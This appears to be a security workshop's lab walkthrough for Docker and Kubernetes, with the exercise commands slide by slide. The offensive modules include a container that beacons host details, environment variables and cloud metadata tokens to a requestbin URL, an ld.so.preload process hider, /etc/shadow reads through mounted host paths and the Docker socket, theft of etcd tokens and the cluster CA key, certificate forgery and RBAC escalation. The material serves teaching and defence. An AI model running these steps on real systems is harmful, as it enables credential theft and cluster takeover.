# Labs Walk Thru
**This is an accompanying file with the lab instructions and commands to help walk thru the labs. It's especially intended for use for those that have trouble copying and pasting from the slides, or prefer not to.**

**If viewing on GitHub, you can navigate using the table of contents button in the top left next to the line count.**

## Module 1 - Docker

#### Slide 11 - Listing namespace you're in

```
ls -l /proc/self/ns/
```

#### Slide 12 - List cgroup for process 1

```
cat /proc/1/cgroup
```

#### Slide 16 - Docker client (exercise)

```
docker --help
```
```
docker run --help
```

#### Slide 17 - Docker health check (troubleshoot)

Is Docker reporting down or VM was stopped after setting up, try running these commands:

```
sudo apt install acl -y
```
```
sudo systemctl status docker
```
Do this if status is not reporting up:

```
sudo systemctl restart docker
```

Create this ACL so you can run docker command without typing sudo everytime.
```
sudo setfacl -m user:$USER:rw /var/run/docker.sock
```

#### Slide 18 - Babby's first image
```
docker run hello-world
```

### Slide 19 - Single Command/Interactive Containers

Running single command in a container
```
docker run alpine ip addr
```

Run an interactive session (shell) within a container (interactive termianl
```
docker run -it alpine /bin/ash
```
Type `exit` to exit the shell session in the container

>  -i, --interactive                    Keep STDIN open even if not attached
>  
>  -t, --tty                            Allocate a pseudo-TTY

### Slide 20 - Interactive Containers (cont)

List running containers?
```
docker ps
```
Where's the container, was it destroyed?
```
docker ps --all
```

Note: Replace \<id\> below with the container id from the output of the above command.
  - Tip: you usually only need the first few letters of the id for Docker to locate.

```
docker start <id>
```
```
docker ps 
```
```
docker attach <id>
```

Note: exit once done
```
exit
```

### Slide 21 - Background a container

```
docker run -d nginx
```

```
docker ps
```

```
docker stop <nginx_container_id>
```
  
Overide name commands (optional):
```
docker run --name webserver -d nginx
```
```
docker container ls
```

### Slide 22 - Container Persistence

```
docker ps -a
```

### Slide 23 - Process Hierarchy

```
docker run -d nginx
```
```
ps auxf
```

## Module 2 - Exploring Containers

### Slide 26 - Where do images come from?

```
docker search nmap
```

### Slide 28 - Exercise: Exploring Images and Container History

```
docker run --name hist -it alpine /bin/ash
```
Inside the container shell run:
```
mkdir test && touch /test/Lorem
```
```
exit
```
Back on the host run:
```
docker container diff hist
```
```
docker container commit hist history_test
```
```
docker image history history_test
```

### Slide 29 - Exercise: Exploring Container Images and History from DockerHub

```
docker search wellsfargo
```

### Slide 30 - Docker Image History

```
docker pull wellsfargo102/upload
```

```
docker image ls
```

```
docker history wellsfargo102/upload
```

```
docker history --no-trunc --format "{{.CreatedAt}}: {{.CreatedBy}}" wellsfargo102/upload |less
```

### Slide 32 - Extract without running

```
docker create wellsfargo102/upload
```

Note: Replace $container_id with Container ID returned by last command (only need first part)
```
docker cp $container_id:/app.jar /tmp/app.jar
```
```
ls /tmp/*.jar
```
```
vim /tmp/app.jar
```
Remember `[ESC]` then `:wq` to exit from vim/view

Now that we've extracted the jar, we can remove the container. Use same container id from a few commands ago for command below.
```
docker rm $container_id
```

### Slide 33 - Optional, quick checks

```
file /tmp/app.jar
```
```
mkdir /tmp/app
```
```
unzip /tmp/app.jar -d /tmp/app/
```
```
cat /tmp/app/META-INF/MANIFEST.MF
```
Note the start class
```
strings /tmp/app.jar |less 
```

### Slide 34 - Going the distance - decompile (with docker!)

```
docker run -it --rm -v /tmp/:/mnt/ --user $(id -u):$(id -g) kwart/jd-cli /mnt/app.jar -od /mnt/app-decompiled
```

```
ls /tmp/app-decompiled/
```

```
less /tmp/app-decompiled/BOOT-INF/classes/com/wellsfargo/uploadexcel/entity/StockDetailsEntity.java
```

### Slide 35 - Manual Reversing (just another way of extracting files from an image)

```
cd ~ && mkdir testimage && cd testimage
```
```
docker pull nginx
```
```
docker save -o nginx.tar nginx
```
```
tar -xvf nginx.tar
```

### Slide 36 - Manual Reversing cont.

```
cat <hash>/json | jq
```

### Slide 38 - Optional - Automated

```
sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 nginx:latest
```
```
sudo docker run -t --rm -v /var/run/docker.sock:/var/run/docker.sock:ro pegleg/whaler -sV=1.36 wellsfargo102/upload
```

### Slide 42 - is nginx real?

```
docker image inspect nginx | jq
```

```
docker trust inspect nginx | jq
```

## Module 3: Offensive Docker Techniques

### Slide 47 - Starting Tracee

Start a new terminal window
```
docker run --name tracee --rm -it --pid=host --cgroupns=host --privileged -v /etc/os-release:/etc/os-release-host:ro \
-e LIBBPFGO_OSRELEASE_FILE=/etc/os-release-host aquasec/tracee:latest
```

>Ctrl-C will stop tracee if needed

### Slide 48 - Create a Dockerfile

```
cd ~ && mkdir imagetest && cd imagetest && vi Dockerfile
```

Note: Go to requestbin.com and choose the public bin link below the large Create Request Bin button

Paste the below contents into the vi after hitting `i` for insert
```
FROM ubuntu:20.04
RUN groupadd -g 999 usertest && \
useradd -r -u 999 -g usertest usertest
RUN apt update && apt install -y curl tini
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
RUN chmod +x docker-entrypoint.sh
USER usertest
# Go to requestbin.com and get a public url and replace REQUESTBIN_URL below
ENV URL REQUESTBIN_URL
ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
# Replace HANDLE with your l33t hacker name or some other identifying designation
ENV USER HANDLE
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
> After pasting, hit `[ESC]`, then type `:wq`


### Slide 49 - Create an entrypoint script

```
vi docker-entrypoint.sh
```
Paste the below script into the vi after hitting `i` for insert 
```
#!/usr/bin/env bash

if [ "shell" = "${1}" ]; then
  /bin/bash
else
  while true
  do
    sleep 30
    curl -s  -X POST -A "${UA}" -H "X-User: ${USER}" -H "Cookie: `uname -a | gzip | base64 -w0`" $URL
    echo
  done
fi
```
> After pasting, hit `ESC`, then type `:wq`

### Slide 50 - Build and run your image

```
docker build -t cmddemo .
```

```
docker run cmddemo
```

### Slide 51 - Build and run your image (cont.)

The trick to this one is pasting the contents of the cookie field in the request you recieved on requestbin, into the base64 command below. This will decode it and pipe through gunzip to decompress the contents.
```
base64 -d <<< [cookie field content] | gunzip
```

>Take a look back at tracee terminal per slide 52

### Slide 53 - Observing Docker

```
docker ps
```
Note name or id of running container and use it in command below
```
docker stop [name or id of running cmddemo container]
```

```
docker events
```

>Alternative to docker events command:
>```
>sudo ctr --address /var/run/containerd/containerd.sock events
>```

### Slide 55 - Working with external data / using Docker in your offensive toolkit

```
docker run --rm -it instrumentisto/nmap -A -T4 scanme.nmap.org
```

Where's the output? (optional)
```
mkdir ~/vol_test && cd ~/vol_test/
```
```
docker run -v ~/vol_test:/output instrumentisto/nmap -sT -oA /output/test scanme.nmap.org 
```
```
ls -l ~/vol_test
```
```
cat test.nmap
```

### Slide 57 - Docker with root or etc mounted as volume

```
docker run -it -v /:/host alpine /bin/ash
```
```
cat /host/etc/shadow
```
```
exit
```

### Slide 58 - Docker running privileged containers

```
docker run -it --privileged ubuntu /bin/bash
```
```
apt update && apt-get install -y libcap2-bin
```
```
capsh --prunt
```
```
grep Cap /proc/self/status
```
```
capsh --decode=0000003fffffffff
```
```
exit
```

### Slide 59 - Exercise: Docker socket exposed in container

```
docker run -it -v /var/run/docker.sock:/var/run/docker.sock ubuntu /bin/dash
```

```
cd var/run/ && ls -l
```

```
apt update && apt install -y curl socat
```

```
echo '{"Image":"ubuntu","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/etc/","Target":"/host_etc"}]}' > container.json
```

```
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d "$(cat container.json)" http://localhost/containers/create
```
Make note of the first 4-5 characters of the ID returned, you'll need it in the next command.
```
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<id 4-5 first chars>/start
```

### Slide 60 - Exposed docker socket hijinx (cont.)

```
socat - UNIX-CONNECT:/var/run/docker.sock
```
Make sure you do this carefully and be sure to put the container id in the POST url
```
POST /containers/<id-first-5-chars>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp


```
After hitting enter twice, the socket should return an http status indicating the connection was upgraded.
```
ls
```
```
cat /host_etc/shadow
```

### Slide 61 - Docker persistence

```
docker run --restart nginx
```


### Slide 63 - Exercise: Libprocess hider lab

Let's go back to our cmddemo Dockerfile
```
cd ~/imagetest
```
```
git clone https://github.com/gianlucaborello/libprocesshider
```
```
cd libprocesshider && vi processhider.c
```

Change this:
```
/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "evil_script.py";
```
to this (use `i` to enter insert mode in vi):
```
static const char* process_to_filter = "sleep";
```
> After changing, hit `[ESC]`, then type `:wq`

Compile:
```
make
```

### Slide 64 - Libprocess hider lab (cont.)

```
cd ..
```
We're going to update the Dockerfile from our cmddemo to do more things
```
vi Dockerfile
```
We're going to add 4 new lines

>Reminder about vi: `i` for insert mode to edit text, use arrow keys to navigate, `[ESC]` to exit insert mode, `:wq` to save(write to file) and quit

Between these two lines
```
RUN apt update && apt upgrade -y && apt install -y curl tini
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
```
Add:
```
COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
```
This copies in the library we just compiled and adds an entry to the ld.so.preload file to load it during "preload"

Between these two lines
```
ENV USER HANDLE
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
add and replace PASSWORD with one you made up:
```
# Replace password with a unique one of your own
ENV PW PASSWORD
```

When is all done, your Dockerfile should look like this.

```
FROM ubuntu:20.04
RUN groupadd -g 999 usertest && \
useradd -r -u 999 -g usertest usertest
RUN apt update && apt upgrade -y && apt install -y curl tini
COPY ./libprocesshider/libprocesshider.so /usr/local/lib/libso5.so
RUN echo "/usr/local/lib/libso5.so" >> /etc/ld.so.preload
COPY ./docker-entrypoint.sh /docker-entrypoint.sh
RUN chmod +x /docker-entrypoint.sh
USER usertest
# Go to requestbin.net and get a public url and replace below
ENV URL REQUESTBIN_URL
ENV UA "Mozilla/5.0 (BeOS; U; BeOS BePC; en-US; rv:1.8.1.7) Gecko/20070917 BonEcho/2.0.0.7"
# Replace HANDLE with your l33t hacker name or some other identifying designation
ENV USER HANDLE
# Replace password with a unique one of your own
ENV PW PASSWORD
ENTRYPOINT ["/usr/bin/tini", "--", "/docker-entrypoint.sh"]
```
> After pasting, hit `[ESC]`, then type `:wq`

### Slide 65 - Libprocess hider lab (cont.)

>`[ESC]` then type `:wq` if you haven't already from last slide

We're also going to edit the docker-entrypoint.sh file, it's easier to just replace the whole thing.
```
vi docker-entrypoint.sh
```

>vi Tip: just hit `dd` repeatedly to delete whole lines, then go into insert mode and paste the contents below
```
#!/usr/bin/env bash

if [ "shell" = "${1}" ]; then
  /bin/bash
else
 while true
 do
    sleep 30
    curl -s  -X POST -A "${UA}" -H "X-User: ${HANDLE}" -H "Cookie: `uname -a | gzip | base64 -w0`" -d \
`{ env && curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token; } | gzip | openssl enc -e -aes-256-cbc -md sha512 -pbkdf2 -salt -a -pass "pass:${PW}" | base64 -w0` \
$URL
    echo
 done
fi
```

This adds a little more data to our exfil, we'll go over this.

> After pasting, hit `[ESC]`, then type `:wq`

### Slide 66 - Libprocess hider lab (cont.)

>`[ESC]` then type `:wq` if you haven't already from last slide

Rebuild the container
```
docker build -t cmddemo .
```

Run the container in the background(detached) and just give us the container id (`-d` aka `--detach`)
```
docker run -d cmddemo
```

After 30 seconds, you should see a new request on your requestbin tab (that hopefully you kept open). If not create a new public requestbin, re-edit your Dockerfile, replace the environment variable value with the new one, rebuild, and re-run the container.

### Slide 67 - Libprocess hider lab (cont.)

Decrypt and decode the new data in the raw output of the requestbin request that came in. Replace `[DATA]` with the base64 string from it in the command below. Don't forget to replace `[strong password]` in the command below with the one you set in the Dockerfile.

Enter these commands below as three separate lines, do not hit `[ENTER]` until you've replaced the `[DATA]` and the password.
** use the clipboard function for these comands with newline `\` otherwise it'll hit return before you're ready. **

```
base64 -d <<< [DATA] \
```
```
| openssl enc -d -aes-256-cbc -md sha512 -pbkdf2 -a -salt -pass "pass:[strong password]" \
```
```
| gunzip
```

What do you see? Why would this information be useful to an attacker?

Let's test out the libprocesshider

```
docker ps
```
Use id/name in to replace `[container name/id]` in command below
```
docker exec [container name/id] ps auxf
```
Where's the sleep process?

Run the process list outside the container/namespace.
```
ps auxf |grep systemd
```
There it is, why isn't it hiding the process outside the namespace?

Stop the container (running in background) now that we're done with it. 
```
docker stop [container name/id]
```

## Module 4 - Container IR - GL,HF.

### Slide 69 - Image CTF
```
docker image pull digitalshokunin/webserver
```

### Slide 76 - Clean ups

```
docker system df
```

```
docker system prune
```

```
docker container prune
```

## Module 5 - Kubernetes 101

> No commands for this section

## Module 6 - The Basics of using K8S

### Slide 100 - Creating a namespace

```
kubectl create namespace lab-namespace
```

```
kubectl get namespace
```

### Slide 103 - Accessing a cluster

```
kubectl cluster-info
```

### Slide 105 - Display pods

```
kubectl get pods
```

Specify namespace
```
kubectl get pods -n kube-system
```

All namespaces
```
kubectl get pods --all-namespaces
```

Describe (get more details) on a pod
```
kubectl -n kube-system describe pod <name>
```

### Slide 107 - Run first pod

```
wget https://k8s.io/examples/pods/simple-pod.yaml
```

```
kubectl apply -f simple-pod.yaml --namespace lab-namespace
```

```
kubectl get pods
```

```
kubectl get pods --namespace lab-namespace
```

```
kubectl describe pod nginx --namespace lab-namespace
```

```
kubectl get pod nginx --namespace lab-namespace
```

```
kubectl get pod nginx -o wide --namespace lab-namespace
```

## Module 7 - Kubernetes Security

### Slide 123 - CA keys - golden tickets (lab setup)

```
cd ~ && git clone https://github.com/digital-shokunin/kube_security_lab.git
```

```
cd kube_security_lab/
```

```
cat etcd-noauth.yml
```

```
ansible-playbook etcd-noauth.yml
```
This part may take a couple minutes

### Slide 126 - CA keys - golden tickets (lab)

We need the IP for the cluster, going to get it from Docker container for the control plane and assign it to a shell env variable
```
export CLUSTERIP1=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' etcdnoauth-control-plane)
```
This is needed for etcdctl to work
```
export ETCDCTL_API=3
```

```
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get / --prefix --keys-only
```

Let's go after the admin token
```
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 \
get / --prefix --keys-only |grep admins-account-token
```
Make note of the random string at the end of the token name, you'll need it later

### Slide 127 - CA keys - golden tickets (lab continued)

Replace `[RAND]` at the end of the command below with the random string at the end of the token from the last command
```
etcdctl --insecure-skip-tls-verify --insecure-transport=false --endpoints=https://$CLUSTERIP1:2379 get /registry/secrets/default/admins-account-token-[RAND]
```

Copy the content of the token starting with the eyJ and up to just before the #kubernetes.io, this is the JWT token you'll need to get elevated access to the Kubernetes cluster

Open up vi editing the new file we're creating `token.txt`
```
vi token.txt
```

Paste the contents of the token you copied above by hitting `i`, then pasting.

When done, `[ESC]` to exit insert mode, then type `:` to bring up vim prompt, and type `wq` and press `[ENTER]` to issue the write to file and quit commands to vi

Now we'll save that token as a env variable for later command usage.
```
export TOKEN1=$(cat token.txt)
```

Let's test the token out by listing pods in the kube-system namespace
```
kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system get pods
```

To get at the crown jewels, we'll need to  after the api server, so we'll need the pod name for later.

Replace `[API_SERVER_POD]` with the name of the api server pod (e.g. kube-apiserver-etcdnoauth-control-plane)
```
export APIPOD1=[API_SERVER_POD]
```

Now let's execute a command inside the pod with our admin token to dump the contents of the PKI Certificate Authority private key for the cluster
```
kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
$APIPOD1 -- cat /etc/kubernetes/pki/ca.key
```

While the CA cert for the cluster PKI is public might as well grab that too for convenience.
```
kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
$APIPOD1 -- cat /etc/kubernetes/pki/ca.crt
```

### Slide 131 - CA keys - golden tickets (lab cont.)

Now that we have the private key for the cluster's CA, we can sign any cert we want that the API server will respect

Let's make life easier by just writing the CA's key and cert to local files instead of copying and pasting them.
```
kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
$APIPOD1 -- cat /etc/kubernetes/pki/ca.key -- > ca.key
```

>**Note:** the -- denotes the start of the command to execute in the pod, but the -- at the end denotes the end of the command, so after that the > ca.key which pipes the output into a ca.key file is executed locally, otherwise it'd be executed as part of the command on the pod and wouldn't help us.

```
kubectl --insecure-skip-tls-verify -shttps://$CLUSTERIP1:6443/ --token=$TOKEN1 -n kube-system exec \
$APIPOD1 -- cat /etc/kubernetes/pki/ca.crt -- > ca.crt 
```

Output the two files contents, you should see the out put from the key then the cert
```
cat ca.key ca.crt
```

Now we need to generate a private key for our "user" we're going to impersonate
```
openssl genrsa -out user.key 2048
```

Create a CSR (Certificate Signing Request) and in the subject field, we specify the username as a CN (Common Name) and the group as a O (Organization).
```
openssl req -new -key user.key -subj "/CN=kube-apiserver-kubelet-client/O=system:masters" -out user.csr
```

Since we have the private key and a copy of the public cert, we can now sign this CSR as the CA.
```
openssl x509 -req -in user.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out user.crt -days 1024 -sha256
```
The signed cert is output to user.crt

### Slide 132 - CA keys - golden tickets (extra credit)

Let's test oout this new user cert by authenticating with it, we simply need to add it to our ~/.kube/config file with kubectl
```
kubectl config set-credentials kube-apiserver-kubelet-client --client-certificate=user.crt --client-key=user.key --embed-certs
```

Now that we've added the cert and associated user to our config, let's modify the kind-etcdnoauth context to use it
```
kubectl config set-context kind-etcdnoauth --user=kube-apiserver-kubelet-client --cluster=kind-etcdnoauth --namespace=kube-system
```

Verify kubectl will use the new cluster not the lab cluster in  ~/.kube/config
```
kubectl config use-context kind-etcdnoauth
```

Let's see what this user we've made part of system:masters can do?
```
kubectl auth can-i --list
```

### Slide 133 - CA keys - Cleanup

```
cd ~  && kind delete cluster --name etcdnoauth
```

```
kind get clusters
```

Verify the lab cluster is the only cluster still there

### Slide 136 - Next Lab (setup)

```
cd ~/kube_security_lab/
```

```
ansible-playbook client-machine.yml && ansible-playbook ssh-to-get-secrets.yml
```
This takes a while to run, you'll need the cluster IP from the end of the output for later.

### Slide 140 - RBAC - Privilege Escalation (lab)

Start a shell in the container that will represent the attacker host
```
docker exec -it client /bin/bash
```

From here ssh to a pod that will represent a pod we've compromised and established a shell on. (Password is also `sshuser`)
```
ssh -p 32001 sshuser@[Kubernetes Cluster IP] 
```

The pod has kubectl (because you (the attacker) put it there or because its included in the pod container for some reason

Let's run some commands and see what the pod's service account roles can do.

```
kubectl cluster-info
```

```
kubectl get clusterrolebinding
```

```
kubectl get roles --all-namespaces
```

```
kubectl get pods --all-namespaces
```

Any luck so far? 

### Slide 141 - RBAC - Privilege Escalation (lab)

Let's try one more
```
kubectl get secrets --all-namespaces
```
Bingo, seems it can list secrets...
```
kubectl get secrets -n kube-system |grep clusterrole
```

Let's get the token for an interesting account
```
kubectl -n kube-system get secret clusterrole-aggregation-controller-token-[RAND] -o json
```
> Replace `[RAND]` above with the random token string from the same account displayed in the command you rand before.

Paste the token field from the json output into this command where it says `[TOKEN]`.

```
export TOKEN=`echo [TOKEN] | base64 -d`
```
Now the token is stored decoded inside an environment variable.

If you want to see what it looks like decoded simply type:

```
echo $TOKEN
```

You should recognize the eyJ at the beginning.

### Slide 142 - RBAC - Privilege Escalation (lab)

Use the token we took from the secrets to execute commands on the cluster, and see what it can do.

```
kubectl  --token="$TOKEN" get clusterroles
```

It can't do much either...

Seems one of the things we can do is edit clusterroles, let's edit the roles for the account of the token we stole.

```
kubectl edit clusterrole system:controller:clusterrole-aggregation-controller --token="$TOKEN"
```

This command loaded a policy in vi, go to the bottom of the policy and look for the rules section, you'll want to add/replace the APIGroups, resources, and verbs with the following.

```
- apiGroups:
  - '*'
  resources:
  - '*'
  verbs:
  - '*'
```

Some vi shortcuts that might be useful are [here](https://github.com/lockfale/DC30_Malicious_Containers_Workshop/blob/main/cheatsheet.md#using-vi---useful-shortcuts-for-the-lab)

>Type `[ESC]`, then `:wq` to exit vim and save the policy, if you really mess up, use the `u` key to undo or `[ESC]`, then `q!` to exit without saving and try again.

### Slide 143 - RBAC - Privilege Escalation (lab)

Let's kick the tires on the new policy we set
```
kubectl --token="$TOKEN" -n kube-system get pods
```

Look there's the api-server pod.

```
kubectl --token="$TOKEN" -n kube-system exec [API SERVER POD] -- cat /etc/kubernetes/pki/ca.key
```

Once again, we've owned the cluster.

We've taken two service accounts with heavily restricted roles, but had just enough permissions to escalate from there.

### Slide 145 - RBAC - Privilege Escalation (Clean up)

Need to exit out of the pod session and the client container.

```
exit
```

```
exit
```

Now back at your host machine prompt

```
kind delete cluster --name sshgs
```

```
kind get clusters
```

Should only see the lab cluster running.

>**Note:** The attacker machine container stopped when you exited it, you could remove it if you really want to clean that up to, but there is no real reason to.

### Slide 152 - Demo: Cloud Metadata attacks

Execute a pod in our lab with heavily restricted permissions.

```
kubectl apply -f \
https://raw.githubusercontent.com/digital-shokunin/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml \
--namespace lab-namespace
```

```
kubectl exec -it nothing-allowed-exec-pod -n lab-namespace -- bash
```

```
apt update && apt -y install curl
```

```
curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/'
```

```
curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/id' -w "\n"
```

```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```

```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
```

## Appendix

### Slide 178 - Complex Microservices app demo

You can run this in your lab cluster.

```
kubectl create -f https://raw.githubusercontent.com/microservices-demo/microservices-demo/master/deploy/kubernetes/complete-demo.yaml
```

```
kubectl get deployments -n sock-shop
```

```
kubectl get replicasets -n sock-shop
```

### Slide 177 - Accessing services running in containers

Start up web service, but don't expose externally (e.g. `-p 80:80`), only expose locally on bridge interface

```
docker run --name=netwebserver -d nginx
```

Get the IP of the bridge interface

```
docker inspect -f "{{ .NetworkSettings.IPAddress }}" netwebserver 
```

Access service from host machine thru bridge interface

```
curl http://[IP]
```

Clean up 

```
docker stop netwebserver
```

### Slide 186 - Create side-car pod, test nginx, and remove pod (run in conjunction with babby's first pod

```
kubectl run -it shell-container --image=alpine/curl:3.14 /bin/ash --namespace lab-namespace
```

Get IP from pod description

```
curl http:\\[IP]
```

```
exit
```

```
kubectl delete pod shell-container --namespace lab-namespace
```
